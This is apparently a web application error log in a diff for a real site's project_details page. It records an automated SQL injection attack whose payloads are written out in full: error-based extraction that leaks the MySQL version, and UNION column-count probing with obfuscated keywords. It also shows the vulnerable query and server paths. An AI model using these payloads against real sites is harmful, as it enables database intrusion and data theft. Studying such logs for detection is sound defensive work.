+2019/05/01 11:37:59 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0=A'' at line 1. The SQL statement executed was: SELECT * from projects WHERE id=''0=A'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id='0=A
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id='0=A
+---
+2019/05/01 11:38:01 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**' at line 1. The SQL statement executed was: SELECT * from projects WHERE id='1'(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) ''.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:38:01 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**' at line 1. The SQL statement executed was: SELECT * from projects WHERE id='1'(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) ''' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1'(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+'
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1'(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+'
+---
+2019/05/01 11:38:02 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ABC145ZQ62DWQAFPOIYCFD!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from projects WHERE id='1' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:38:02 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ABC145ZQ62DWQAFPOIYCFD!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from projects WHERE id='1' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/05/01 11:38:03 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.43!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from projects WHERE id='1' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:38:03 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.43!~!1' for key 'group_key'. The SQL statement executed was: SELECT * from projects WHERE id='1' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2019/05/01 11:38:03 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0=A'' at line 1. The SQL statement executed was: SELECT * from projects WHERE id='1'0=A'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:38:03 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0=A'' at line 1. The SQL statement executed was: SELECT * from projects WHERE id='1'0=A'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1'0=A
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1'0=A
+---
+2019/05/01 11:38:58 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:38:58 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39+and+'0'='0
+---
+2019/05/01 11:38:59 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:38:59 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39+and+'0'='0
+---
+2019/05/01 11:38:59 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:38:59 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39+and+'0'='0
+---
+2019/05/01 11:39:00 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:39:00 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39+and+'0'='0
+---
+2019/05/01 11:39:05 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:39:05 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39+and+'0'='0
+---
+2019/05/01 11:39:06 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:39:06 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39+and+'0'='0
+---
+2019/05/01 11:39:06 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
